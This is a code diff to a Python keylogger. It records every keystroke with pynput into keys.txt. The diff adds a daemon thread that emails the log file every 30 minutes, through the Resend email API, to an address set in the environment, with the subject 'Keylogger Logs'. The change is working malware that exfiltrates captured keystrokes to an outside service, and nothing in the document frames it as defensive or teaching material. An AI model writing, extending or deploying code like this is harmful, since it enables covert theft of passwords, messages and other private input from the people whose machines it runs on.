@@ -1,14 +1,44 @@
 #!/usr/bin/env python3
 import os
-from datetime import datetime
-import pynput
-from pynput.keyboard import Key, Listener
+import time
+import threading
 
-# Directory to store logs
-if not os.path.exists("data"):
-    os.makedirs("data")
+from dotenv import load_dotenv
+from pynput.keyboard import Listener
+import resend
 
-LOG_FILE = "data/" + str(datetime.today().strftime("%Y-%m-%d-%H:%M:%S")) + ".txt"
+load_dotenv()
+
+resend.api_key = os.environ["RESEND_API_KEY"]
+
+LOG_FILE = "keys.txt"
+EMAIL_DELAY = 1800  # delay in seconds
+
+
+def send_email():
+    while True:
+        try:
+            with open(LOG_FILE, "rb") as f:
+                file_data = f.read()
+
+            attachment: resend.Attachment = {
+                "content": list(file_data),
+                "filename": f.name,
+            }
+
+            params: resend.Emails.SendParams = {
+                "from": "Keylogger <onboarding@resend.dev>",
+                "to": [os.environ["EMAIL"]],
+                "subject": "Keylogger Logs",
+                "html": "<p>This file contains the logs.</p>",
+                "attachments": [attachment],
+            }
+
+            resend.Emails.send(params)
+        except FileNotFoundError:
+            pass
+
+        time.sleep(EMAIL_DELAY)
 
 
 def on_press(key):
@@ -26,6 +56,9 @@ def on_press(key):
             key = " [Escape] "
         log.write(key)
 
+
+thread = threading.Thread(target=send_email, daemon=True)
+thread.start()
 
 with Listener(on_press=on_press) as listener:
     listener.join()
